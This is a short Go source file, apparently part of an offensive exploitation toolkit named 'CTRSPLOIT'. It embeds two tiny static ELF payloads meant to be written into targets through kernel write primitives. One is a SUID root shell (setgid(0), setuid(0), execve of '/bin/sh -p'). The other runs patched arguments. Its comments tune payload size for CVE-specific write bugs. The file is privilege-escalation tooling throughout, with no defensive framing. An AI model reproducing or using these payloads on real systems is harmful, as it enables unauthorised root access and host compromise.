package pipeprimitive

import _ "embed"

const (
	staticShellArgMarker  = "CTRSPLOIT_STATIC_SHELL_ARGV_V1"
	staticShellMaxArgs    = 3
	staticShellArgBufSize = 256
)

//go:generate go run ./material/generate_suid_payload.go
//go:generate go run ./material/generate_static_shell_payload.go

// suidShellPayloadAMD64 is a minimal static ELF that runs:
// setgid(0); setuid(0); execve("/bin/sh", ["/bin/sh", "-p"], nil).
//
// Keep this short: CVE-specific constrained write primitives may need one
// kernel trigger per byte and can hit kernel key quota limits with larger ELF
// payloads.
//
//go:embed material/suid-shell-amd64.bin
var suidShellPayloadAMD64 []byte

// staticShellPayloadAMD64 is a tiny static ELF that execves patched argv.
// It is useful when the target is an ELF and the write primitive cannot turn
// byte 0 into a shebang marker.
//
//go:embed material/static-shell-amd64.bin
var staticShellPayloadAMD64 []byte
